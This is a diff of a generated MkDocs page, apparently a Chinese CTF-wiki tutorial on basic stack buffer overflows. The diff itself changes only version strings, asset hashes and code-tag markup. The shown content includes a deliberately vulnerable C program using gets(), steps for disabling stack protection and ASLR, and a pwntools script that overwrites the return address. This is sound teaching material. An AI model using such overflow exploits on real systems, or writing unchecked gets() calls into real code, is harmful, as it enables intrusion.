@@ -38,7 +38,7 @@
         <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
       
       <link rel="shortcut icon" href="../../../..">
-      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
+      <meta name="generator" content="mkdocs-1.1, mkdocs-material-4.6.3">
     
     
       
@@ -46,9 +46,9 @@
       
     
     
-      <link rel="stylesheet" href="../../../../assets/stylesheets/application.e194128b.css">
+      <link rel="stylesheet" href="../../../../assets/stylesheets/application.adb8469c.css">
       
-        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.3e3d1dff.css">
+        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.a8b3c06d.css">
       
       
         
@@ -57,7 +57,7 @@
       
     
     
-      <script src="../../../../assets/javascripts/modernizr.74668098.js"></script>
+      <script src="../../../../assets/javascripts/modernizr.86422ebf.js"></script>
     
     
       
@@ -4790,7 +4790,7 @@
 </ul>
 <h2 id="_3">基本示例<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
 <p>最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，<strong>当然需要确保这个地址所在的段具有可执行权限</strong>。下面，我们举一个简单的例子：</p>
-<div class="codehilite"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<div class="codehilite"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
 <span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
 <span class="kt">void</span> <span class="nf">success</span><span class="p">()</span> <span class="p">{</span> <span class="n">puts</span><span class="p">(</span><span class="s">&quot;You Hava already controlled it.&quot;</span><span class="p">);</span> <span class="p">}</span>
 <span class="kt">void</span> <span class="nf">vulnerable</span><span class="p">()</span> <span class="p">{</span>
@@ -4803,18 +4803,18 @@
   <span class="n">vulnerable</span><span class="p">();</span>
   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <p>这个程序的主要目的读取一个字符串，并将其输出。<strong>我们希望可以控制程序执行 success 函数。</strong></p>
 <p>我们利用如下命令对其进行编译</p>
-<div class="codehilite"><pre><span></span>➜  stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example 
+<div class="codehilite"><pre><span></span><code>➜  stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example 
 stack_example.c: In <span class="k">function</span> ‘vulnerable’:
 stack_example.c:6:3: warning: implicit declaration of <span class="k">function</span> ‘gets’ <span class="o">[</span>-Wimplicit-function-declaration<span class="o">]</span>
    gets<span class="o">(</span>s<span class="o">)</span><span class="p">;</span>
    ^
 /tmp/ccPU8rRA.o：在函数‘vulnerable’中：
 stack_example.c:<span class="o">(</span>.text+0x27<span class="o">)</span>: 警告： the <span class="sb">`</span>gets<span class="err">&#39;</span> <span class="k">function</span> is dangerous and should not be used.
-</pre></div>
+</code></pre></div>
 
 <p>可以看出 gets 本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出，</p>
 <blockquote>
@@ -4823,13 +4823,13 @@ stack_example.c:<span class="o">(</span>.text+0x27<span class="o">)</span>: 警�
 <p>gcc 编译指令中，<code>-m32</code> 指的是生成 32 位程序； <code>-fno-stack-protector</code> 指的是不开启堆栈溢出保护，即不生成 canary。
 此外，为了更加方便地介绍栈溢出的基本利用方式，这里还需要关闭 PIE（Position Independent Executable），避免加载基址被打乱。不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令<code>gcc -v</code>查看gcc 默认的开关情况。如果含有<code>--enable-default-pie</code>参数则代表 PIE 默认已开启，需要在编译指令中添加参数<code>-no-pie</code>。</p>
 <p>编译成功后，可以使用 checksec 工具检查编译出的文件：</p>
-<p><div class="codehilite"><pre><span></span>➜  stack-example checksec stack_example
+<p><div class="codehilite"><pre><span></span><code>➜  stack-example checksec stack_example
     Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    No canary found
     NX:       NX enabled
     PIE:      No PIE (0x8048000)
-</pre></div>
+</code></pre></div>
 提到编译时的 PIE 保护，Linux平台下还有地址空间分布随机化（ASLR）的机制。简单来说即使可执行文件开启了 PIE 保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE 时基址不同）。我们可以通过修改 <code>/proc/sys/kernel/randomize_va_space</code> 来控制 ASLR 启动与否，具体的选项有</p>
 <ul>
 <li>0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。</li>
@@ -4839,17 +4839,17 @@ stack_example.c:<span class="o">(</span>.text+0x27<span class="o">)</span>: 警�
 <p>我们可以使用<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>关闭 Linux 系统的 ASLR，类似的，也可以配置相应的参数。</p>
 <p>为了降低后续漏洞利用复杂度，我们这里关闭 ASLR，在编译时关闭 PIE。当然读者也可以尝试 ASLR、PIE 开关的不同组合，配合 IDA 及其动态调试功能观察程序地址变化情况（在 ASLR 关闭、PIE 开启时也可以攻击成功）。</p>
 <p>确认栈溢出和 PIE 保护关闭后，我们利用 IDA 来反编译一下二进制程序并查看 vulnerable 函数 。可以看到</p>
-<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="nf">vulnerable</span><span class="p">()</span>
+<div class="codehilite"><pre><span></span><code><span class="kt">int</span> <span class="nf">vulnerable</span><span class="p">()</span>
 <span class="p">{</span>
   <span class="kt">char</span> <span class="n">s</span><span class="p">;</span> <span class="c1">// [sp+4h] [bp-14h]@1</span>
 
   <span class="n">gets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
   <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <p>该字符串距离 ebp 的长度为 0x14，那么相应的栈结构为</p>
-<div class="codehilite"><pre><span></span>                                           +-----------------+
+<div class="codehilite"><pre><span></span><code>                                           +-----------------+
                                            |     retaddr     |
                                            +-----------------+
                                            |     saved ebp   |
@@ -4861,10 +4861,10 @@ stack_example.c:<span class="o">(</span>.text+0x27<span class="o">)</span>: 警�
                                            |                 |
                                            |                 |
                               s,ebp-0x14--&gt;+-----------------+
-</pre></div>
+</code></pre></div>
 
 <p>并且，我们可以通过 IDA 获得 success 的地址，其地址为 0x0804843B。</p>
-<div class="codehilite"><pre><span></span><span class="nl">.text:</span><span class="err">0804843</span><span class="nf">B</span> <span class="no">success</span>         <span class="no">proc</span> <span class="no">near</span>
+<div class="codehilite"><pre><span></span><code><span class="nl">.text:</span><span class="err">0804843</span><span class="nf">B</span> <span class="no">success</span>         <span class="no">proc</span> <span class="no">near</span>
 <span class="nl">.text:</span><span class="err">0804843</span><span class="nf">B</span>                 <span class="no">push</span>    <span class="no">ebp</span>
 <span class="nl">.text:</span><span class="err">0804843</span><span class="nf">C</span>                 <span class="no">mov</span>     <span class="no">ebp</span><span class="p">,</span> <span class="no">esp</span>
 <span class="nl">.text:</span><span class="err">0804843</span><span class="nf">E</span>                 <span class="no">sub</span>     <span class="no">esp</span><span class="p">,</span> <span class="mi">8</span>
@@ -4876,14 +4876,14 @@ stack_example.c:<span class="o">(</span>.text+0x27<span class="o">)</span>: 警�
 <span class="nl">.text:</span><span class="err">08048452</span>                 <span class="nf">leave</span>
 <span class="nl">.text:</span><span class="err">08048453</span>                 <span class="nf">retn</span>
 <span class="nl">.text:</span><span class="err">08048453</span> <span class="nf">success</span>         <span class="no">endp</span>
-</pre></div>
+</code></pre></div>
 
 <p>那么如果我们读取的字符串为</p>
-<div class="codehilite"><pre><span></span>0x14*&#39;a&#39;+&#39;bbbb&#39;+success_addr
-</pre></div>
+<div class="codehilite"><pre><span></span><code>0x14*&#39;a&#39;+&#39;bbbb&#39;+success_addr
+</code></pre></div>
 
 <p>那么，由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 success_addr，即，此时的栈结构为</p>
-<div class="codehilite"><pre><span></span>                                           +-----------------+
+<div class="codehilite"><pre><span></span><code>                                           +-----------------+
                                            |    0x0804843B   |
                                            +-----------------+
                                            |       bbbb      |
@@ -4895,14 +4895,14 @@ stack_example.c:<span class="o">(</span>.text+0x27<span class="o">)</span>: 警�
                                            |                 |
                                            |                 |
                               s,ebp-0x14--&gt;+-----------------+
-</pre></div>
+</code></pre></div>
 
 <p>但是需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即0x0804843B 在内存中的形式是</p>
-<div class="codehilite"><pre><span></span>\x3b\x84\x04\x08
-</pre></div>
+<div class="codehilite"><pre><span></span><code>\x3b\x84\x04\x08
+</code></pre></div>
 
 <p>但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候\，x等也算一个单独的字符。。所以我们需要想办法将 \x3b 作为一个字符输入进去。那么此时我们就需要使用一波 pwntools 了(关于如何安装以及基本用法，请自行 github)，这里利用 pwntools 的代码如下：</p>
-<div class="codehilite"><pre><span></span><span class="c1">##coding=utf8</span>
+<div class="codehilite"><pre><span></span><code><span class="c1">##coding=utf8</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="c1">## 构造与程序交互的对象</span>
 <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./stack_example&#39;</span><span class="p">)</span>
@@ -4914,10 +4914,10 @@ stack_example.c:<span class="o">(</span>.text+0x27<span class="o">)</span>: 警�
 <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="c1">## 将代码交互转换为手工交互</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <p>执行一波代码，可以得到</p>
-<div class="codehilite"><pre><span></span>➜  stack-example python exp.py
+<div class="codehilite"><pre><span></span><code>➜  stack-example python exp.py
 <span class="o">[</span>+<span class="o">]</span> Starting <span class="nb">local</span> process <span class="s1">&#39;./stack_example&#39;</span>: pid <span class="m">61936</span>
 <span class="p">;</span><span class="se">\x</span><span class="m">84</span><span class="se">\x</span><span class="m">0</span>
 <span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
@@ -4927,7 +4927,7 @@ You Hava already controlled it.
 $ 
 <span class="o">[</span>*<span class="o">]</span> Process <span class="s1">&#39;./stack_example&#39;</span> stopped with <span class="nb">exit</span> code -11 <span class="o">(</span>SIGSEGV<span class="o">)</span> <span class="o">(</span>pid <span class="m">61936</span><span class="o">)</span>
 <span class="o">[</span>*<span class="o">]</span> Got EOF <span class="k">while</span> sending in interactive
-</pre></div>
+</code></pre></div>
 
 <p>可以看到我们确实已经执行 success 函数。</p>
 <h2 id="_4">小总结<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
@@ -5071,7 +5071,7 @@ $
       
     </div>
     
-      <script src="../../../../assets/javascripts/application.970603a6.js"></script>
+      <script src="../../../../assets/javascripts/application.df00da5d.js"></script>
       
         
         
@@ -5086,7 +5086,7 @@ $
           
         
       
-      <script>app.initialize({version:"1.0.4",url:{base:"../../../.."}})</script>
+      <script>app.initialize({version:"1.1",url:{base:"../../../.."}})</script>
       
         <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
       
